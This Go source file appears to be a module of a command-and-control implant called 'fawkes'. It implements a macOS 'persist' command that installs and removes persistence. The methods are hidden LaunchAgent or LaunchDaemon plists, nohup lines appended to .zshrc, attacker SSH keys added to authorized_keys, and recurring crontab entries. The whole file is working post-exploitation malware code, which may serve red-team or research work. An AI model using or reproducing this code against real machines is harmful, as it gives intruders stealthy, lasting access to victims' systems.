//go:build darwin
// +build darwin

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type PersistCommand struct{}

func (c *PersistCommand) Name() string {
	return "persist"
}

func (c *PersistCommand) Description() string {
	return "Install or remove persistence mechanisms"
}

type persistArgs struct {
	Method   string `json:"method"`
	Action   string `json:"action"`
	Name     string `json:"name"`
	Path     string `json:"path"`
	Hive     string `json:"hive"`
	CLSID    string `json:"clsid"`
	Timeout  string `json:"timeout"`
	Schedule string `json:"schedule"`
	User     string `json:"user"`
}

func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
	var args persistArgs

	if task.Params == "" {
		return errorResult("Error: parameters required (method, action, name, path)")
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if args.Action == "" {
		args.Action = "install"
	}

	switch strings.ToLower(args.Method) {
	case "launchagent", "launchdaemon", "launch-agent", "launch-daemon":
		return persistLaunchAgent(args)
	case "shell-profile", "shell", "bashrc":
		return persistShellProfile(args)
	case "ssh-key", "authorized-keys":
		return persistSSHKey(args)
	case "crontab", "cron":
		return persistCrontab(args)
	case "list":
		return persistDarwinList()
	default:
		return errorf("Unknown method: %s. Use: launchagent, shell-profile, ssh-key, crontab, or list", args.Method)
	}
}

// persistLaunchAgent installs or removes a LaunchAgent/LaunchDaemon plist
func persistLaunchAgent(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistLaunchAgentInstall(args)
	case "remove":
		return persistLaunchAgentRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistLaunchAgentInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (executable to persist) is required")
	}
	if args.Name == "" {
		args.Name = "com.fawkes.agent"
	}

	// Determine LaunchAgent vs LaunchDaemon
	isDaemon := strings.ToLower(args.Method) == "launchdaemon" || strings.ToLower(args.Method) == "launch-daemon"
	isRoot := os.Getuid() == 0

	var plistDir string
	var scope string
	if isDaemon && isRoot {
		plistDir = "/Library/LaunchDaemons"
		scope = "system daemon"
	} else {
		home, _ := os.UserHomeDir()
		plistDir = filepath.Join(home, "Library", "LaunchAgents")
		scope = "user agent"
	}

	os.MkdirAll(plistDir, 0755)
	plistPath := filepath.Join(plistDir, args.Name+".plist")

	// Generate plist XML
	plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
`, args.Name, args.Path)

	if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
		return errorf("Failed to write plist: %v", err)
	}

	// Load the agent
	loadCmd := exec.Command("launchctl", "load", "-w", plistPath)
	if out, err := loadCmd.CombinedOutput(); err != nil {
		return errorf("Plist created at %s but launchctl load failed: %v\n%s", plistPath, err, string(out))
	}

	return successResult(fmt.Sprintf("LaunchAgent persistence installed:\n  Label: %s\n  Scope: %s\n  Plist: %s\n  Executable: %s\n  Status: loaded + running\n\nRemove with: persist -method launchagent -action remove -name %s", args.Name, scope, plistPath, args.Path, args.Name))
}

func persistLaunchAgentRemove(args persistArgs) structs.CommandResult {
	if args.Name == "" {
		args.Name = "com.fawkes.agent"
	}

	// Try both user and system locations
	home, _ := os.UserHomeDir()
	locations := []string{
		filepath.Join(home, "Library", "LaunchAgents", args.Name+".plist"),
		filepath.Join("/Library/LaunchAgents", args.Name+".plist"),
		filepath.Join("/Library/LaunchDaemons", args.Name+".plist"),
	}

	for _, plistPath := range locations {
		if _, err := os.Stat(plistPath); err == nil {
			// Unload first
			exec.Command("launchctl", "unload", "-w", plistPath).CombinedOutput()

			if err := os.Remove(plistPath); err != nil {
				return errorf("Failed to remove %s: %v", plistPath, err)
			}
			return successResult(fmt.Sprintf("Removed LaunchAgent persistence: %s", plistPath))
		}
	}

	return errorf("No plist found for label '%s' in LaunchAgents/LaunchDaemons directories", args.Name)
}

// persistShellProfile — shared implementation (same as Linux)
func persistShellProfile(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistShellProfileInstall(args)
	case "remove":
		return persistShellProfileRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistShellProfileInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (command to execute on login) is required")
	}

	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	home, _ := os.UserHomeDir()
	profilePath := filepath.Join(home, ".zshrc") // macOS default shell is zsh

	existing, _ := os.ReadFile(profilePath)
	if strings.Contains(string(existing), marker) {
		return errorf("Shell profile already contains marker '%s'. Remove first.", marker)
	}

	entry := fmt.Sprintf("\n# BEGIN %s\nnohup %s >/dev/null 2>&1 &\n# END %s\n", marker, args.Path, marker)

	f, err := os.OpenFile(profilePath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		return errorf("Failed to open %s: %v", profilePath, err)
	}
	defer f.Close()

	if _, err := f.WriteString(entry); err != nil {
		return errorf("Failed to write to %s: %v", profilePath, err)
	}

	return successResult(fmt.Sprintf("Shell profile persistence installed:\n  File: %s\n  Command: %s\n  Marker: %s\n\nRemove with: persist -method shell-profile -action remove -name %s", profilePath, args.Path, marker, marker))
}

func persistShellProfileRemove(args persistArgs) structs.CommandResult {
	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	home, _ := os.UserHomeDir()
	profiles := []string{
		filepath.Join(home, ".zshrc"),
		filepath.Join(home, ".zshenv"),
		filepath.Join(home, ".zprofile"),
		filepath.Join(home, ".bashrc"),
		filepath.Join(home, ".bash_profile"),
		filepath.Join(home, ".profile"),
	}

	removed := 0
	for _, profilePath := range profiles {
		data, err := os.ReadFile(profilePath)
		if err != nil {
			continue
		}

		content := string(data)
		beginTag := fmt.Sprintf("# BEGIN %s", marker)
		endTag := fmt.Sprintf("# END %s", marker)

		if !strings.Contains(content, beginTag) {
			continue
		}

		lines := strings.Split(content, "\n")
		var filtered []string
		inBlock := false
		for _, line := range lines {
			if strings.Contains(line, beginTag) {
				inBlock = true
				continue
			}
			if strings.Contains(line, endTag) {
				inBlock = false
				continue
			}
			if !inBlock {
				filtered = append(filtered, line)
			}
		}

		if err := os.WriteFile(profilePath, []byte(strings.Join(filtered, "\n")), 0644); err != nil {
			continue
		}
		removed++
	}

	if removed == 0 {
		return errorf("No shell profile entries found with marker '%s'", marker)
	}

	return successResult(fmt.Sprintf("Removed persistence from %d shell profile(s) with marker '%s'", removed, marker))
}

// persistSSHKey — shared implementation (same as Linux)
func persistSSHKey(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistSSHKeyInstall(args)
	case "remove":
		return persistSSHKeyRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistSSHKeyInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (SSH public key string) is required")
	}

	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	targetHome, _ := os.UserHomeDir()
	sshDir := filepath.Join(targetHome, ".ssh")
	os.MkdirAll(sshDir, 0700)
	authKeysPath := filepath.Join(sshDir, "authorized_keys")

	existing, _ := os.ReadFile(authKeysPath)
	if strings.Contains(string(existing), marker) {
		return errorf("authorized_keys already contains marker '%s'. Remove first.", marker)
	}

	keyLine := fmt.Sprintf("%s %s\n", strings.TrimSpace(args.Path), marker)

	f, err := os.OpenFile(authKeysPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		return errorf("Failed to open %s: %v", authKeysPath, err)
	}
	defer f.Close()

	if _, err := f.WriteString(keyLine); err != nil {
		return errorf("Failed to write to %s: %v", authKeysPath, err)
	}

	return successResult(fmt.Sprintf("SSH key persistence installed:\n  File: %s\n  Marker: %s\n\nRemove with: persist -method ssh-key -action remove -name %s", authKeysPath, marker, marker))
}

func persistSSHKeyRemove(args persistArgs) structs.CommandResult {
	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	targetHome, _ := os.UserHomeDir()
	authKeysPath := filepath.Join(targetHome, ".ssh", "authorized_keys")
	data, err := os.ReadFile(authKeysPath)
	if err != nil {
		return errorf("Failed to read %s: %v", authKeysPath, err)
	}

	lines := strings.Split(string(data), "\n")
	var filtered []string
	removed := 0
	for _, line := range lines {
		if strings.Contains(line, marker) {
			removed++
			continue
		}
		filtered = append(filtered, line)
	}

	if removed == 0 {
		return errorf("No authorized_keys entries found with marker '%s'", marker)
	}

	if err := os.WriteFile(authKeysPath, []byte(strings.Join(filtered, "\n")), 0600); err != nil {
		return errorf("Failed to write %s: %v", authKeysPath, err)
	}

	return successResult(fmt.Sprintf("Removed %d SSH key(s) with marker '%s' from %s", removed, marker, authKeysPath))
}

// persistCrontab — macOS also supports crontab
func persistCrontab(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistCrontabInstall(args)
	case "remove":
		return persistCrontabRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistCrontabInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (executable to persist) is required")
	}
	if args.Schedule == "" {
		args.Schedule = "*/5 * * * *"
	}

	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}
	cronLine := fmt.Sprintf("%s %s # %s", args.Schedule, args.Path, marker)

	var currentCrontab string
	cmd := exec.Command("crontab", "-l")
	output, err := cmd.CombinedOutput()
	if err != nil {
		currentCrontab = ""
	} else {
		currentCrontab = string(output)
	}

	if strings.Contains(currentCrontab, marker) {
		return errorf("Crontab entry with marker '%s' already exists. Remove first.", marker)
	}

	newCrontab := currentCrontab
	if !strings.HasSuffix(newCrontab, "\n") && newCrontab != "" {
		newCrontab += "\n"
	}
	newCrontab += cronLine + "\n"

	installCmd := exec.Command("crontab", "-")
	installCmd.Stdin = strings.NewReader(newCrontab)
	if out, err := installCmd.CombinedOutput(); err != nil {
		return errorf("Failed to install crontab: %v\n%s", err, string(out))
	}

	return successResult(fmt.Sprintf("Crontab persistence installed:\n  Schedule: %s\n  Command: %s\n  Marker: %s", args.Schedule, args.Path, marker))
}

func persistCrontabRemove(args persistArgs) structs.CommandResult {
	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	cmd := exec.Command("crontab", "-l")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return errorResult("No crontab entries found")
	}

	lines := strings.Split(string(output), "\n")
	var filtered []string
	removed := 0
	for _, line := range lines {
		if strings.Contains(line, "# "+marker) {
			removed++
			continue
		}
		filtered = append(filtered, line)
	}

	if removed == 0 {
		return errorf("No crontab entries found with marker '%s'", marker)
	}

	installCmd := exec.Command("crontab", "-")
	installCmd.Stdin = strings.NewReader(strings.Join(filtered, "\n"))
	if out, err := installCmd.CombinedOutput(); err != nil {
		return errorf("Failed to update crontab: %v\n%s", err, string(out))
	}

	return successResult(fmt.Sprintf("Removed %d crontab entry/entries with marker '%s'", removed, marker))
}

// persistDarwinList lists installed persistence mechanisms
func persistDarwinList() structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== INSTALLED PERSISTENCE (macOS) ===\n\n")

	// LaunchAgents
	home, _ := os.UserHomeDir()
	agentDirs := []string{
		filepath.Join(home, "Library", "LaunchAgents"),
		"/Library/LaunchAgents",
		"/Library/LaunchDaemons",
	}

	for _, dir := range agentDirs {
		sb.WriteString(fmt.Sprintf("[%s]\n", dir))
		entries, err := os.ReadDir(dir)
		if err != nil {
			sb.WriteString("  (not accessible)\n")
			continue
		}
		count := 0
		for _, e := range entries {
			if strings.HasSuffix(e.Name(), ".plist") && !strings.HasPrefix(e.Name(), "com.apple.") {
				sb.WriteString(fmt.Sprintf("  %s\n", e.Name()))
				count++
			}
		}
		if count == 0 {
			sb.WriteString("  (no custom plists)\n")
		}
	}

	// Crontab
	sb.WriteString("\n[Crontab]\n")
	cmd := exec.Command("crontab", "-l")
	if output, err := cmd.CombinedOutput(); err == nil {
		lines := strings.Split(string(output), "\n")
		for _, line := range lines {
			if strings.TrimSpace(line) != "" && !strings.HasPrefix(strings.TrimSpace(line), "#") {
				sb.WriteString(fmt.Sprintf("  %s\n", line))
			}
		}
	} else {
		sb.WriteString("  (no crontab)\n")
	}

	// Shell profiles
	sb.WriteString("\n[Shell Profile Persistence]\n")
	profiles := []string{".zshrc", ".zshenv", ".zprofile", ".bashrc", ".bash_profile", ".profile"}
	found := false
	for _, p := range profiles {
		path := filepath.Join(home, p)
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		if strings.Contains(string(data), "# BEGIN ") {
			sb.WriteString(fmt.Sprintf("  %s: contains persistence markers\n", path))
			found = true
		}
	}
	if !found {
		sb.WriteString("  (none found)\n")
	}

	// SSH keys
	sb.WriteString("\n[SSH Authorized Keys]\n")
	authKeys := filepath.Join(home, ".ssh", "authorized_keys")
	if data, err := os.ReadFile(authKeys); err == nil {
		lines := strings.Split(string(data), "\n")
		count := 0
		for _, line := range lines {
			if strings.TrimSpace(line) != "" {
				count++
			}
		}
		sb.WriteString(fmt.Sprintf("  %s: %d keys\n", authKeys, count))
	} else {
		sb.WriteString("  (no authorized_keys)\n")
	}

	return successResult(sb.String())
}
